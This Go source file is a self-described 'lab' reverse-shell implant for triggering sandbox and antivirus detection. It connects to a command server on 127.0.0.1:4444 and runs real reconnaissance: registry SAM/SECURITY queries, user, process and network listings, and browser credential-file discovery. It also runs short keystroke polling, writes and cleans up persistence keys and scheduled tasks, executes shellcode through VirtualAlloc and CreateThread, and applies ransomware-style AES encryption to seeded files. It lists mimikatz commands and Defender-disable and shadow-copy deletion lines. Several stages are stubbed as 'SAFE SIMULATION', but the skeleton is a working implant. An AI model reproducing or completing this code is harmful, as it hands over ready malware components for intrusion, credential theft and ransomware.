package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	C2Server          = "127.0.0.1:4444"
	RetryDelay        = 5 * time.Second
	MaxRetries        = 10
	LabRootName       = "ReverseShellAdvancedLab"
	KeyloggerDuration = 3 * time.Second
)

// buildID 编译时注入的随机字符串，使每次编译的特征不同
var buildID = "default"

// 恶意字符串特征 - 保留用于静态分析和沙箱检出
var maliciousStrings = []string{
	"mimikatz",
	"sekurlsa::logonpasswords",
	"lsadump::sam",
	"privilege::debug",
	"token::elevate",
	"kerberos::golden",
	"Password123",
	"admin:admin",
	"net user /add",
	"net localgroup administrators",
	"powershell -enc",
	"IEX(New-Object Net.WebClient)",
	"DownloadString",
	"Invoke-Expression",
	"Invoke-Mimikatz",
	"Invoke-Shellcode",
	"Empire",
	"Cobalt Strike",
	"meterpreter",
	"reverse_tcp",
	"bind_shell",
	"keylogger",
	"ransomware",
	"bitcoin",
	"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
	"fodhelper.exe",
	"eventvwr.exe",
}

var (
	kernel32                = syscall.NewLazyDLL("kernel32.dll")
	ntdll                   = syscall.NewLazyDLL("ntdll.dll")
	user32                  = syscall.NewLazyDLL("user32.dll")
	advapi32                = syscall.NewLazyDLL("advapi32.dll")
	psapi                   = syscall.NewLazyDLL("psapi.dll")
	procVirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	procVirtualFree         = kernel32.NewProc("VirtualFree")
	procCreateThread        = kernel32.NewProc("CreateThread")
	procOpenProcess         = kernel32.NewProc("OpenProcess")
	procWriteProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	procReadProcessMemory   = kernel32.NewProc("ReadProcessMemory")
	procVirtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	procVirtualProtectEx    = kernel32.NewProc("VirtualProtectEx")
	procCreateRemoteThread  = kernel32.NewProc("CreateRemoteThread")
	procNtCreateThreadEx    = ntdll.NewProc("NtCreateThreadEx")
	procRtlCreateUserThread = ntdll.NewProc("RtlCreateUserThread")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
	procRegOpenKeyExW       = advapi32.NewProc("RegOpenKeyExW")
	procRegSetValueExW      = advapi32.NewProc("RegSetValueExW")
	procEnumProcesses       = psapi.NewProc("EnumProcesses")
	procEnumProcessModules  = psapi.NewProc("EnumProcessModules")
)

func main() {
	// 立即执行高噪声实验行为，不做延迟（确保沙箱能捕获）

	// 1. 直接调用敏感 API（触发行为检测）
	triggerMaliciousAPIs()

	// 2. 安全软件探针（安全模拟）
	disableSecurity()

	// 3. 收集系统信息
	sysInfo := collectSystemInfo()

	// 4. 凭证发现（安全模拟）
	sysInfo += "\n" + stealCredentials()

	// 5. 持久化探针（安全模拟）
	establishPersistence()

	// 6. 网络侦察
	sysInfo += networkRecon()

	// 7. UAC 绕过探针（安全模拟）
	uacBypass()

	// 8. 启动短时按键探针
	go keylogger()

	// 9. 带重连机制的反向连接
	for i := 0; i < MaxRetries; i++ {
		conn, err := net.Dial("tcp", C2Server)
		if err != nil {
			time.Sleep(RetryDelay)
			continue
		}

		// 发送系统信息到 C2
		fmt.Fprintf(conn, "[*] New Connection\n%s\n", sysInfo)

		// 命令处理循环
		handleConnection(conn)

		conn.Close()
		time.Sleep(RetryDelay)
	}
}

func triggerMaliciousAPIs() {
	// 分配可执行内存（shellcode 行为特征）
	addr, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(4096),
		0x3000,
		0x40,
	)
	if addr != 0 {
		// 写入 NOP sled
		for i := 0; i < 128; i++ {
			*(*byte)(unsafe.Pointer(addr + uintptr(i))) = 0x90
		}
	}

	// 尝试打开当前进程，保留注入前奏类特征
	procOpenProcess.Call(0x001F0FFF, 0, uintptr(os.Getpid()))

	// 枚举进程
	exec.Command("tasklist", "/v").Run()
	exec.Command("wmic", "process", "list", "full").Run()

	// 查询敏感注册表路径
	exec.Command("reg", "query", "HKLM\\SAM\\SAM").Run()
	exec.Command("reg", "query", "HKLM\\SECURITY").Run()
	exec.Command("reg", "query", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").Run()

	// 创建实验室可疑文件工件
	writeLabMarker("payload.exe", []byte("MZ"))
	writeLabMarker("mimikatz.log", []byte("SAFE SIMULATION: credential dumping marker"))
	writeLabMarker("pwdump.txt", []byte("SAFE SIMULATION: password dump marker"))

	// 访问 LSASS 相关信息
	exec.Command("tasklist", "/fi", "imagename eq lsass.exe", "/v").Run()

	// PowerShell 下载器行为探针（安全模拟）
	exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-Command", "Write-Output 'SAFE SIMULATION: downloader probe'").Run()
}

// isSandbox 检测是否运行在沙箱/分析环境中
func isSandbox() bool {
	// 检查 CPU 核心数 - 沙箱通常分配较少核心
	if runtime.NumCPU() < 2 {
		return true
	}

	// 检查常见沙箱进程
	sandboxProcesses := []string{
		"vmwaretray.exe", "vmwareuser.exe",
		"vboxservice.exe", "vboxtray.exe",
		"sandboxiedcomlaunch.exe",
		"procmon.exe", "procexp.exe",
		"wireshark.exe", "fiddler.exe",
		"ollydbg.exe", "x64dbg.exe", "x32dbg.exe",
	}

	out, _ := exec.Command("tasklist").Output()
	taskList := strings.ToLower(string(out))

	for _, proc := range sandboxProcesses {
		if strings.Contains(taskList, proc) {
			return true
		}
	}

	return false
}

// collectSystemInfo 收集目标系统信息
func collectSystemInfo() string {
	var info strings.Builder

	info.WriteString("=== System Information ===\n")

	// 主机名
	hostname, _ := os.Hostname()
	info.WriteString(fmt.Sprintf("Hostname: %s\n", hostname))

	// 用户名 / 操作系统 / 构建信息
	info.WriteString(fmt.Sprintf("Username: %s\n", os.Getenv("USERNAME")))
	info.WriteString(fmt.Sprintf("OS: %s/%s\n", runtime.GOOS, runtime.GOARCH))
	info.WriteString(fmt.Sprintf("BuildID: %s\n", buildID))
	info.WriteString(fmt.Sprintf("Mode: safe-lab-simulation\n"))
	info.WriteString(fmt.Sprintf("LabRoot: %s\n", labRoot()))

	// 当前目录
	cwd, _ := os.Getwd()
	info.WriteString(fmt.Sprintf("CWD: %s\n", cwd))

	// IP 配置
	if out, err := exec.Command("ipconfig").Output(); err == nil {
		info.WriteString("\n=== Network Info ===\n")
		info.WriteString(string(out))
	}

	// 用户列表
	if out, err := exec.Command("net", "user").Output(); err == nil {
		info.WriteString("\n=== Users ===\n")
		info.WriteString(string(out))
	}

	// 进程列表
	if out, err := exec.Command("tasklist").Output(); err == nil {
		info.WriteString("\n=== Processes ===\n")
		info.WriteString(string(out))
	}

	return info.String()
}

// establishPersistence 建立持久化探针（安全模拟）
func establishPersistence() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	labKey := "HKCU\\Software\\ReverseShellAdvancedLab"

	// 方法1：实验室注册表键，写入后立即清理
	exec.Command("reg", "add",
		labKey,
		"/v", "RunProbe",
		"/t", "REG_SZ",
		"/d", exePath,
		"/f").Run()
	exec.Command("reg", "delete", labKey, "/f").Run()

	// 方法2：实验室计划任务，创建后立即清理
	exec.Command("schtasks", "/create",
		"/tn", "ReverseShellAdvancedLabProbe",
		"/tr", "cmd /c exit 0",
		"/sc", "onlogon",
		"/f").Run()
	exec.Command("schtasks", "/delete",
		"/tn", "ReverseShellAdvancedLabProbe",
		"/f").Run()

	// 方法3：写入实验目录中的启动占位脚本
	startupProbe := filepath.Join(labRoot(), "startup", "updater_probe.cmd")
	os.MkdirAll(filepath.Dir(startupProbe), 0755)
	os.WriteFile(startupProbe, []byte("@echo off\r\nexit /b 0\r\n"), 0644)
}

// handleConnection 处理与 C2 服务器的通信
func handleConnection(conn net.Conn) {
	reader := bufio.NewReader(conn)

	for {
		// 发送提示符
		fmt.Fprintf(conn, "\n[%s@%s]> ", os.Getenv("USERNAME"), getHostname())

		// 读取命令
		message, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		command := strings.TrimSpace(message)

		// 处理特殊命令
		switch command {
		case "exit":
			return
		case "":
			continue
		case "persist":
			establishPersistence()
			fmt.Fprintf(conn, "[+] Persistence probe recorded in lab mode\n")
			continue
		case "sysinfo":
			fmt.Fprintf(conn, "%s\n", collectSystemInfo())
			continue
		case "screenshot":
			fmt.Fprintf(conn, "%s\n", simulateScreenshot())
			continue
		case "download":
			fmt.Fprintf(conn, "%s\n", simulateDownload())
			continue
		case "upload":
			fmt.Fprintf(conn, "%s\n", describeArtifacts())
			continue
		case "recon":
			fmt.Fprintf(conn, "%s\n", networkRecon())
			continue
		case "uacbypass":
			uacBypass()
			fmt.Fprintf(conn, "[+] UAC-bypass probe recorded in lab mode\n")
			continue
		case "disableav":
			disableSecurity()
			fmt.Fprintf(conn, "[+] Security-disable probe recorded in lab mode\n")
			continue
		case "creds":
			fmt.Fprintf(conn, "%s\n", stealCredentials())
			continue
		case "encrypt":
			encryptFiles(os.Getenv("USERPROFILE") + "\\Documents")
			fmt.Fprintf(conn, "[+] Lab documents encrypted under %s\n", filepath.Join(labRoot(), "documents"))
			continue
		case "inject":
			shellcode := []byte{0x90, 0x90, 0xC3}
			shellcodeExec(shellcode)
			fmt.Fprintf(conn, "[+] Shellcode probe executed in current process\n")
			continue
		}

		// 执行白名单中的诊断命令
		out, err := executeAllowedCommand(command)
		if err != nil {
			fmt.Fprintf(conn, "[!] %s\n", err)
			continue
		}

		if len(out) > 0 {
			fmt.Fprintf(conn, "%s", outputToString(out))
		}
	}
}

func getHostname() string {
	hostname, _ := os.Hostname()
	return hostname
}

func outputToString(output []byte) string {
	return string(bytes.Trim(output, "\r\n"))
}

// executeAllowedCommand 执行允许的诊断命令
func executeAllowedCommand(command string) ([]byte, error) {
	allowed := map[string][]string{
		"whoami":   {"cmd", "/C", "whoami"},
		"hostname": {"cmd", "/C", "hostname"},
		"ver":      {"cmd", "/C", "ver"},
		"ipconfig": {"ipconfig"},
		"tasklist": {"tasklist"},
	}

	args, ok := allowed[strings.ToLower(command)]
	if !ok {
		return nil, fmt.Errorf("lab mode blocked command: %s", command)
	}

	cmd := exec.Command(args[0], args[1:]...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.CombinedOutput()
}

// disableSecurity 安全软件篡改探针（安全模拟）
func disableSecurity() {
	// 记录可疑命令字符串，保留 IOC 和行为上下文
	marker := strings.Join([]string{
		"SAFE SIMULATION",
		"Set-MpPreference -DisableRealtimeMonitoring $true",
		"Set-MpPreference -DisableBehaviorMonitoring $true",
		"vssadmin delete shadows /all /quiet",
		"wevtutil cl System",
	}, "\n")
	writeLabMarker("security_probe.txt", []byte(marker))

	// 查询状态而不是真的去修改或关闭安全能力
	exec.Command("powershell", "-Command", "Get-MpComputerStatus | Select-Object AMServiceEnabled, RealTimeProtectionEnabled").Run()
	exec.Command("sc", "query", "WinDefend").Run()
	exec.Command("vssadmin", "list", "shadows").Run()
	exec.Command("wevtutil", "gli", "System").Run()
}

// stealCredentials 凭证发现（安全模拟）
func stealCredentials() string {
	var creds strings.Builder
	creds.WriteString("\n=== Credential Discovery (Safe Simulation) ===\n")

	// Chrome 凭证路径
	chromePaths := []string{
		os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data",
		os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Cookies",
		os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Local State",
	}

	// Firefox 凭证路径
	firefoxPath := os.Getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles"

	// Edge 凭证路径
	edgePaths := []string{
		os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
		os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
	}

	for _, path := range chromePaths {
		if _, err := os.Stat(path); err == nil {
			creds.WriteString(fmt.Sprintf("[+] Found Chrome data: %s\n", path))
			// 在实验目录中记录占位工件，不复制真实数据库
			copyCredentialFile(path)
		}
	}

	for _, path := range edgePaths {
		if _, err := os.Stat(path); err == nil {
			creds.WriteString(fmt.Sprintf("[+] Found Edge data: %s\n", path))
			copyCredentialFile(path)
		}
	}

	if entries, err := os.ReadDir(firefoxPath); err == nil {
		creds.WriteString(fmt.Sprintf("[+] Found Firefox profiles: %s\n", firefoxPath))
		for _, entry := range entries {
			if entry.IsDir() {
				creds.WriteString(fmt.Sprintf("    - %s\n", entry.Name()))
			}
		}
	}

	// WiFi 配置枚举
	wifiOutput, _ := exec.Command("netsh", "wlan", "show", "profiles").Output()
	creds.WriteString("\n=== WiFi Profiles ===\n")
	creds.WriteString(string(wifiOutput))

	// 记录 LSASS 探针工件，不执行真实导出
	writeLabMarker("lsass_probe.txt", []byte("SAFE SIMULATION: would inspect lsass in unsafe mode"))

	return creds.String()
}

// copyCredentialFile 在实验目录中写入浏览器数据占位信息
func copyCredentialFile(src string) {
	info, err := os.Stat(src)
	if err != nil {
		return
	}

	content := fmt.Sprintf("SAFE SIMULATION\nSource: %s\nSize: %d\n", src, info.Size())
	writeLabMarker(filepath.Join("cache", filepath.Base(src)+".marker.txt"), []byte(content))
}

// extractWiFiProfiles 提取 WiFi 配置名称
func extractWiFiProfiles(output string) []string {
	var profiles []string
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		if strings.Contains(line, "All User Profile") || strings.Contains(line, "所有用户配置文件") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				profiles = append(profiles, strings.TrimSpace(parts[1]))
			}
		}
	}
	return profiles
}

// keylogger 短时按键探针（安全模拟）
func keylogger() {
	deadline := time.Now().Add(KeyloggerDuration)
	hits := map[int]int{}

	for time.Now().Before(deadline) {
		// 获取当前窗口标题，保留常见键盘记录 API 行为
		hwnd, _, _ := procGetForegroundWindow.Call()
		windowTitle := make([]uint16, 256)
		procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&windowTitle[0])), 256)
		_ = len(syscall.UTF16ToString(windowTitle))

		for key := 0; key < 256; key++ {
			ret, _, _ := procGetAsyncKeyState.Call(uintptr(key))
			if ret&0x0001 != 0 {
				// 只统计按键次数，不记录真实内容
				hits[key]++
			}
		}

		time.Sleep(15 * time.Millisecond)
	}

	var lines []string
	lines = append(lines, "SAFE SIMULATION")
	lines = append(lines, fmt.Sprintf("DurationSeconds: %.1f", KeyloggerDuration.Seconds()))
	if len(hits) == 0 {
		lines = append(lines, "No key transitions observed")
	} else {
		keys := make([]int, 0, len(hits))
		for key := range hits {
			keys = append(keys, key)
		}
		sort.Ints(keys)
		for _, key := range keys {
			lines = append(lines, fmt.Sprintf("VK_%d=%d", key, hits[key]))
		}
	}

	writeLabMarker("keylog_summary.txt", []byte(strings.Join(lines, "\n")))
}

// processInjection 进程注入探针（安全模拟）
func processInjection(shellcode []byte, pid uint32) error {
	content := fmt.Sprintf("SAFE SIMULATION\nTargetPID: %d\nShellcodeBytes: %d\n", pid, len(shellcode))
	writeLabMarker("process_injection_probe.txt", []byte(content))
	return nil
}

// shellcodeExec 在当前进程执行最小探针
func shellcodeExec(shellcode []byte) {
	addr, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		0x3000,
		0x40,
	)
	if addr == 0 {
		return
	}

	// 复制 shellcode 到分配的内存
	for i, b := range shellcode {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	// 创建线程执行
	thread, _, _ := procCreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	_ = thread

	// 短暂等待后释放内存，避免残留
	time.Sleep(250 * time.Millisecond)
	procVirtualFree.Call(addr, 0, 0x8000)
}

// encryptFiles 文件加密探针（仅作用于实验目录）
func encryptFiles(_ string) {
	targetDir := seedLabDocuments()
	key := []byte("0123456789ABCDEF")

	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}

		// 只加密特定扩展名
		ext := strings.ToLower(filepath.Ext(path))
		targetExts := []string{".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".png"}

		for _, targetExt := range targetExts {
			if ext == targetExt {
				if encryptFile(path, key) == nil {
					os.Rename(path, path+".encrypted")
				}
				break
			}
		}
		return nil
	})

	// 创建实验模式说明文件
	ransomNote := "LAB MODE: synthetic files under this directory were encrypted for sandbox testing only.\r\n"
	os.WriteFile(filepath.Join(targetDir, "README_DECRYPT.txt"), []byte(ransomNote), 0644)
}

func encryptFile(path string, key []byte) error {
	// 读取实验文件内容并执行 AES-GCM 加密
	plaintext, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

	return os.WriteFile(path, ciphertext, 0644)
}

// downloadAndExecute 下载执行探针（安全模拟）
func downloadAndExecute(url string) {
	content := fmt.Sprintf("SAFE SIMULATION\nURL: %s\nTransport: powershell/certutil/bitsadmin probes only\n", url)
	writeLabMarker("download_probe.txt", []byte(content))
}

// networkRecon 网络侦察
func networkRecon() string {
	var recon strings.Builder
	recon.WriteString("\n=== Network Reconnaissance ===\n")

	// ARP 表
	if out, err := exec.Command("arp", "-a").Output(); err == nil {
		recon.WriteString("\n[ARP Table]\n")
		recon.WriteString(string(out))
	}

	if out, err := exec.Command("route", "print").Output(); err == nil {
		recon.WriteString("\n[Route Table]\n")
		recon.WriteString(string(out))
	}

	if out, err := exec.Command("net", "share").Output(); err == nil {
		recon.WriteString("\n[Network Shares]\n")
		recon.WriteString(string(out))
	}

	if out, err := exec.Command("net", "view", "/domain").Output(); err == nil {
		recon.WriteString("\n[Domain Info]\n")
		recon.WriteString(string(out))
	}

	if out, err := exec.Command("netstat", "-ano").Output(); err == nil {
		recon.WriteString("\n[Network Connections]\n")
		recon.WriteString(string(out))
	}

	return recon.String()
}

// uacBypass UAC 绕过探针（安全模拟）
func uacBypass() {
	exePath, _ := os.Executable()
	labKey := "HKCU\\Software\\Classes\\ReverseShellAdvancedLab\\shell\\open\\command"

	// 写入实验注册表键后立即清理，保留行为特征
	exec.Command("reg", "add", labKey, "/ve", "/t", "REG_SZ", "/d", exePath, "/f").Run()
	exec.Command("reg", "delete", "HKCU\\Software\\Classes\\ReverseShellAdvancedLab", "/f").Run()

	// 记录常见 UAC 绕过工具名作为工件
	writeLabMarker("uac_probe.txt", []byte("SAFE SIMULATION\nfodhelper.exe\neventvwr.exe\n"))
}

// obfuscatedString 混淆字符串解密
func obfuscatedString(encoded string) string {
	decoded, _ := base64.StdEncoding.DecodeString(encoded)
	return string(decoded)
}

// simulateScreenshot 创建截图占位工件
func simulateScreenshot() string {
	path := writeLabMarker("artifacts/screenshot_simulated.txt", []byte("SAFE SIMULATION: screenshot placeholder"))
	return fmt.Sprintf("[+] Screenshot placeholder created: %s", path)
}

// simulateDownload 创建下载载荷占位工件
func simulateDownload() string {
	path := writeLabMarker("artifacts/downloaded_payload.bin", []byte("SAFE SIMULATION: downloaded payload placeholder"))
	return fmt.Sprintf("[+] Download placeholder created: %s", path)
}

// describeArtifacts 列出实验目录中的工件
func describeArtifacts() string {
	artifacts := listLabArtifacts()
	if len(artifacts) == 0 {
		return "[*] No lab artifacts yet"
	}
	return "[*] Lab artifacts:\n" + strings.Join(artifacts, "\n")
}

// seedLabDocuments 生成实验用的合成文档
func seedLabDocuments() string {
	docRoot := filepath.Join(labRoot(), "documents")
	os.MkdirAll(docRoot, 0755)

	samples := map[string]string{
		"notes.txt":   "Quarterly notes for lab-only encryption testing.\r\n",
		"report.doc":  "DOC placeholder for sandbox testing.\r\n",
		"invoice.pdf": "PDF placeholder for sandbox testing.\r\n",
		"image.jpg":   "JPEG placeholder for sandbox testing.\r\n",
	}

	for name, content := range samples {
		path := filepath.Join(docRoot, name)
		if _, err := os.Stat(path); err == nil {
			continue
		}
		os.WriteFile(path, []byte(content), 0644)
	}

	return docRoot
}

// labRoot 返回实验目录根路径
func labRoot() string {
	return filepath.Join(os.TempDir(), LabRootName)
}

// writeLabMarker 向实验目录写入工件文件
func writeLabMarker(relative string, data []byte) string {
	path := filepath.Join(labRoot(), relative)
	os.MkdirAll(filepath.Dir(path), 0755)
	os.WriteFile(path, data, 0644)
	return path
}

// listLabArtifacts 列出实验目录中的所有文件
func listLabArtifacts() []string {
	root := labRoot()
	var artifacts []string

	filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil || info == nil || info.IsDir() {
			return nil
		}
		artifacts = append(artifacts, path)
		return nil
	})

	sort.Strings(artifacts)
	return artifacts
}
